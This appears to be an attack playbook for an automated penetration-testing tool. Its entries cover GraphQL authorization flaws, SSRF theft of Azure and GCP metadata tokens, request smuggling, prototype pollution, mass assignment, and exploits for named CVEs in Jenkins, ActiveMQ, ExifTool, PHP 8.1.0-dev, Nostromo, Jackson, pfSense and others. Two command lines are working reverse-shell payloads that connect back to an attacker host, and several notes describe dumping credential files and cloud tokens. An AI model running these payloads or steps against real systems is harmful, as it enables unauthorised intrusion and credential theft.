actions.hypothesis: A GraphQL endpoint fronts the whole data model from one URL and is routinely under-secured. Introspection often stays on, handing you every type, query, and mutation; from there you probe for authorization enforced per-resolver rather than centrally, which means a query returning another user's data or a mutation you should not be allowed to call. Batched queries can also bypass rate limits. Introspect first, map the sensitive operations, then test each for missing authorization and injection.
actions.proves: a GraphQL operation returning or changing data you should not be able to reach
actions.does_not_prove: a vulnerability from introspection alone; a reachable operation that still enforces authorization is not a finding

report.finding: GraphQL broken object/function-level authorization

commands.run: curl -s http://{{target}}/graphql -d '{"query":"{__schema{queryType{name} mutationType{name} types{name fields{name}}}}"}' -H "Content-Type: application/json"
commands.note: Introspection returns every type, query, and mutation. If it is off, guess common fields or diff the client JS.
Look for users, secrets, admin, update, delete; returning another user's data unauthenticated is a direct finding.
Call privileged mutations as a low-privilege or anonymous user; a mutation you should not run is the escalation.

actions.title: Azure IMDS Managed-Identity Token via SSRF
actions.hypothesis: On an Azure VM the instance metadata service at 169.254.169.254 hands out an access token for the VM's managed identity to anything that can reach it, so an SSRF on an app running there is a token for the cloud. Unlike AWS you must ask for a specific resource (ARM, Key Vault, Storage) and pass the Metadata:true header, which the SSRF has to smuggle. A management-API token enumerates the subscription, reads Key Vault secrets, and can runCommand on a VM for code execution.
actions.proves: a managed-identity token the SSRF can retrieve from the Azure metadata service
actions.does_not_prove: cloud access from the token alone; what the identity's role assignment permits still has to be tested

report.finding: Azure managed-identity token exposed via SSRF to IMDS

commands.note: Instance metadata confirms an Azure VM and names the resource group; smuggle the Metadata header through the SSRF.
Request a token scoped to ARM; a separate token is needed per resource (Key Vault uses resource=https://vault.azure.net).
Load the token and list what the identity can see: subscriptions, resource groups, VMs, Key Vaults.
A Contributor or VM-admin role lets you runCommand on a VM as root/SYSTEM.

actions.title: GCP Metadata SSRF to Service-Account Token
actions.hypothesis: The GCP metadata server at 169.254.169.254 hands out an OAuth access token for the instance service account to anything that can reach it, so an SSRF on a GCP-hosted app is a token for the project. It needs the Metadata-Flavor: Google header the SSRF must smuggle, and the token reach is whatever scopes and IAM roles the service account carries. With it you enumerate the project, read Secret Manager and Cloud Storage, and look for an actAs or deploy role that runs code. It is the GCP twin of the AWS and Azure metadata paths.
actions.proves: a service-account OAuth token the SSRF can retrieve from the GCP metadata server
actions.does_not_prove: project access from the token alone; the service account IAM roles still decide its reach

report.finding: GCP service-account token exposed via SSRF to metadata

commands.note: Instance metadata confirms a GCP VM and names the project; smuggle the Metadata-Flavor header through the SSRF.
The OAuth token starts ya29.; check .../default/scopes for a broad cloud-platform scope.
Enumerate projects, buckets, secrets, and service accounts the identity can reach.
Read Secret Manager values (base64); decode and feed into the credential loop.

actions.title: HTTP Request Smuggling (CL.TE / TE.CL)
actions.hypothesis: When a front-end proxy and a back-end server disagree about where a request ends (Content-Length vs Transfer-Encoding), you can smuggle a second request inside the first. The back-end treats your trailing bytes as the start of the next victim request, letting you poison the next response, bypass front-end access controls, or capture other users traffic. It only exists where a request passes through more than one HTTP parser.
actions.proves: a parser disagreement that lets a smuggled request reach the back-end out of band
actions.does_not_prove: impact until the desync is developed into a routed or captured request; a single timing blip is not a finding

report.finding: HTTP request smuggling (CL.TE/TE.CL desync)

commands.note: A Via or cache header means a front-end sits in front of the origin: the precondition for a desync.
A long consistent delay on the CL.TE probe (vs an instant control) confirms the desync.
Smuggle a prefix the back-end queues onto the next victim request; develop iteratively.

actions.title: Prototype Pollution to Privilege / RCE
actions.hypothesis: If a Node app merges attacker-controlled keys into an object without filtering __proto__, you can set properties on the shared Object.prototype that every object then inherits. Server-side that is privilege escalation (set an isAdmin the app later reads), denial of service, or RCE where a polluted property feeds a template or child_process gadget. The tell is a JSON merge, Object.assign, or a nested query-string parser.
actions.proves: a pollutable merge where a property set via __proto__ appears on an unrelated object
actions.does_not_prove: impact until a gadget reads the polluted property; pollution alone is not escalation

report.finding: Prototype pollution via unsafe object merge

commands.note: If polluted comes back on an object that never had it, the merge pollutes the prototype. constructor.prototype is the fallback.
Pollute a property the app trusts for authorization, then hit a privileged route.
Confirm the polluted property is honoured; a template/child_process gadget turns it into RCE.

actions.title: Mass Assignment / Autobinding
actions.hypothesis: When a framework binds every field of a request body straight onto a model, you can set fields the UI never exposes. Add role, isAdmin, verified, or balance to a profile update or signup, and if the binder is not allow-listed you set a property you were never meant to control. It is a one-request privilege escalation: diff the fields the app returns against the fields it accepts, then send the privileged one back.
actions.proves: a binder that writes a privileged field the client should not control
actions.does_not_prove: escalation until the field is honoured, not just stored; prove which it is

report.finding: Mass assignment of a privileged field

commands.note: Every field the API returns is a candidate to write, including ones the form hides (role, isAdmin, verified).
Add the privileged field to an update the UI never would; if it echoes back, the write stuck.
The create endpoint is often less guarded than update; a fresh admin account is cleaner than escalating a watched one.

actions.title: Jenkins CLI Arbitrary File Read (CVE-2024-23897)
actions.hypothesis: Jenkins versions before 2.442 / LTS 2.426.3 contain an arbitrary file read vulnerability (CVE-2024-23897) in the args4j command parser. An attacker can use @file syntax over the unauthenticated Jenkins CLI to leak the first lines of arbitrary files on the host, including /etc/passwd, secrets/master.key, secrets/hudson.util.Secret, and encrypted credentials.xml.
actions.proves: demonstrates arbitrary file read access on the Jenkins controller via args4j CLI expansion
actions.does_not_prove: file read only; does not provide interactive remote code execution without cascading credential decryption or admin session forgery

report.finding: Jenkins CLI Arbitrary File Read (CVE-2024-23897)

commands.note: PREFERRED (Linux /etc/passwd Read): Download jenkins-cli.jar from http://{{target}}:{{web_port|8080}}/jnlpJars/jenkins-cli.jar and read system accounts.
JENKINS MASTER KEY READ: Extract the Jenkins master encryption key used to decrypt credentials.xml.
HUDSON UTIL SECRET READ: Extract the Hudson secret decryption key used alongside master.key.
CREDENTIALS.XML READ: Dump the encrypted credentials database containing stored passwords, SSH keys, and API tokens.

actions.title: Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604)
actions.hypothesis: Apache ActiveMQ versions prior to 5.15.16, 5.16.7, 5.17.6, or 5.18.3 allow unauthenticated remote code execution via OpenWire protocol (default port 61616). When processing a marshalled ExceptionResponse, the broker instantiates arbitrary classes via ClassPathXmlApplicationContext, loading an XML payload from an attacker-controlled HTTP server to execute system commands.
actions.proves: achieves unauthenticated remote code execution on the ActiveMQ broker host as the service user
actions.does_not_prove: does not prove root or Administrator privileges; privilege escalation may be required following the initial shell

report.finding: Apache ActiveMQ OpenWire Remote Code Execution (CVE-2023-46604)

commands.note: PREFERRED (OpenWire RCE Trigger): Sends a crafted OpenWire packet instructing ActiveMQ to load an XML Spring configuration containing a ProcessBuilder reverse shell.

actions.title: TVT NVMS-1000 Directory Traversal Arbitrary File Read (CVE-2019-20085)
actions.hypothesis: TVT NVMS-1000 video surveillance web services allow unauthenticated path traversal via direct GET requests with directory traversal sequences (/../../../../). Remote attackers can read arbitrary files including win.ini, configuration files with plaintext passwords, and user desktop flags.
actions.proves: demonstrates unauthenticated arbitrary file read access on the target Windows system via NVMS-1000 path traversal
actions.does_not_prove: arbitrary file read only; does not provide direct shell execution without extracting valid administrative credentials or upload vectors

report.finding: TVT NVMS-1000 Unauthenticated Directory Traversal (CVE-2019-20085)

commands.note: VERIFY TRAVERSAL (win.ini): Tests NVMS-1000 directory traversal by requesting windows/win.ini. Returns HTTP 200 with win.ini contents.
READ ROOT/PROOF FLAG: Reads the Administrator desktop root.txt or proof.txt flag directly through the unauthenticated traversal.
LEAK NSCLIENT INI CREDENTIALS: Reads the NSClient++ configuration file to recover the cleartext web management console password.

actions.title: ExifTool Metadata Arbitrary Code Execution (CVE-2021-22204)
actions.hypothesis: Applications running ExifTool prior to 12.24 to inspect or strip metadata from uploaded files (JPEG, TIFF, PDF) are vulnerable to arbitrary code execution when parsing crafted DjVu metadata. An embedded DjVu ANT tag inside an image executes shell commands on the server.
actions.proves: remote command execution through server-side ExifTool image processing
actions.does_not_prove: exploitation without a backend file processing pipeline invoking ExifTool

report.finding: ExifTool DjVu Metadata Remote Code Execution (CVE-2021-22204)

commands.note: Checks the local or discovered ExifTool version; versions < 12.24 are vulnerable.

commands.run: python3 -c 'import sys; payload = b"(metadata\n\t(Copyright \"\\\n" b"`bash -i >& /dev/tcp/" + sys.argv[1].encode() + b"/" + sys.argv[2].encode() + b" 0>&1`\"))"; open("exploit.djvu", "wb").write(payload)' {{lhost}} {{lport}}
commands.note: Generates a crafted DjVu exploit payload triggering reverse shell on server-side ExifTool parse.
Uploads the crafted image containing malicious DjVu metadata to trigger execution.

actions.title: PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution
actions.hypothesis: PHP development build 8.1.0-dev contains a malicious backdoor inserted into zend_eval_string that executes arbitrary PHP code if the HTTP User-Agentt header begins with 'zerodium'. Sending system commands in this header gives instant arbitrary code execution with web server permissions.
actions.proves: unauthenticated remote code execution via PHP 8.1.0-dev User-Agentt backdoor
actions.does_not_prove: exploitation on unmodified or standard release PHP versions

report.finding: PHP 8.1.0-dev Malicious Backdoor Remote Code Execution

commands.note: Probes for the PHP 8.1.0-dev backdoor by executing the 'id' command and inspecting output.
Triggers an interactive reverse shell back to attacker listener via User-Agentt backdoor.

actions.title: OpenNetAdmin (ONA) v18.1.1 Command Injection RCE
actions.hypothesis: OpenNetAdmin (ONA) versions <= 18.1.1 are vulnerable to unauthenticated command injection in dcm.php via the xajax module. Passing shell command strings through the xajaxargs array executes arbitrary commands as www-data.
actions.proves: remote command execution through OpenNetAdmin dcm.php xajax command injection
actions.does_not_prove: exploitation against patched ONA instances or secure configurations

report.finding: OpenNetAdmin v18.1.1 Unauthenticated Remote Code Execution

commands.note: Sends crafted xajax POST request to dcm.php to execute id command on the target host.
Triggers reverse shell through OpenNetAdmin xajax parameter injection.

actions.title: Nostromo Web Server (nhttpd) Remote Code Execution (CVE-2019-16278)
actions.hypothesis: Nostromo (nhttpd) web servers prior to version 1.9.6 contain a directory traversal flaw in URI parsing. Unauthenticated attackers can traverse into /bin/sh via /.%0d%0a/bin/sh in HTTP POST requests and execute arbitrary shell commands.
actions.proves: unauthenticated arbitrary command execution via Nostromo path traversal
actions.does_not_prove: exploitation on Nostromo versions 1.9.6 or later

report.finding: Nostromo nhttpd Directory Traversal RCE (CVE-2019-16278)

commands.note: Executes id command via Nostromo nhttpd path traversal in HTTP POST request body.
Launches reverse shell through Nostromo directory traversal execution.

actions.title: Jackson Databind Polymorphic Deserialization RCE (CVE-2019-12384)
actions.hypothesis: Applications parsing JSON using FasterXML Jackson-databind with polymorphic typing enabled (enableDefaultTyping) are vulnerable to remote code execution. Supplying gadget classes like ch.qos.logback.core.db.DriverManagerConnectionSource triggers an outbound H2 JDBC connection that executes arbitrary SQL script payloads via RUNSCRIPT.
actions.proves: arbitrary remote command execution via Jackson Databind H2 JDBC deserialization gadget
actions.does_not_prove: exploitation when polymorphic typing is disabled or patched

report.finding: Jackson Databind Polymorphic Deserialization Remote Code Execution

commands.run: echo 'CREATE ALIAS SHELL EXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; }$$; CALL SHELL("bash -c \'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\'");' > inject.sql && python3 -m http.server 8000
commands.note: Stages malicious H2 database SQL script on local HTTP server to trigger reverse shell upon remote JDBC connect.
Sends crafted polymorphic Jackson JSON payload triggering remote JDBC execution of inject.sql.

actions.title: pfSense RRD Graph Command Injection RCE (CVE-2014-4688)
actions.hypothesis: pfSense 2.1.3 and earlier versions contain an authenticated command injection vulnerability in status_rrd_graph_img.php. The 'database' GET parameter is passed unsanitized into a shell command, allowing authenticated users or credentials recovered from system files to execute commands directly as root.
actions.proves: root command execution on pfSense via status_rrd_graph_img.php command injection
actions.does_not_prove: exploitation without valid administrative or operator credentials

report.finding: pfSense Authenticated RRD Graph Command Injection (CVE-2014-4688)

Triggers interactive root reverse shell on pfSense FreeBSD appliance.

actions.title: IIS web.config Extension Filter Upload Bypass
actions.hypothesis: On IIS web applications where .aspx, .asp, and script extensions are blacklisted, uploading a custom web.config file allows mapping handlers or embedding ASP.NET execution to achieve remote code execution.
actions.proves: bypasses IIS file upload extension filtering using web.config handler mapping
actions.does_not_prove: execution within IIS application pool worker process only

report.finding: IIS web.config Upload Filter Bypass Remote Code Execution

Trigger execution of the uploaded web.config to execute embedded payload and establish reverse shell.

actions.hypothesis: Nibbleblog 4.0.3 My Image plugin fails to validate uploaded image extensions in admin.php, saving the file as image.php in the plugin directory. Authenticating as admin allows uploading a PHP webshell.

actions.hypothesis: Apache Solr versions before 8.3.1 allow enabling params.resource.loader.enabled via config API and evaluating arbitrary Velocity templates via the /select endpoint to achieve remote code execution.

actions.hypothesis: When developers or operators have write access to a GitLab repository tied to an automated CI/CD pipeline or deployment webhook, committing a webshell or reverse shell payload triggers automatic execution in target staging or production environments.

actions.hypothesis: Web applications converting user-supplied HTML into PDF documents using headless renderers (wkhtmltopdf, Puppeteer) evaluate JavaScript. Injecting XMLHttpRequest payloads reading file:/// allows reading server files directly inside the generated PDF.

actions.hypothesis: FreePBX, Asterisk, and Elastix PBX instances store database and management credentials in /etc/amportal.conf or /etc/asterisk/manager.conf. Extracting this file via LFI or unauthorized access leaks credentials often reused for root.

actions.title: Rejetto HttpFileServer Macro Injection RCE
actions.hypothesis: Rejetto HttpFileServer (HFS 2.3) fails to handle null bytes in the search query parameter (CVE-2014-6287), allowing macro execution blocks to execute operating system commands in the server process context.
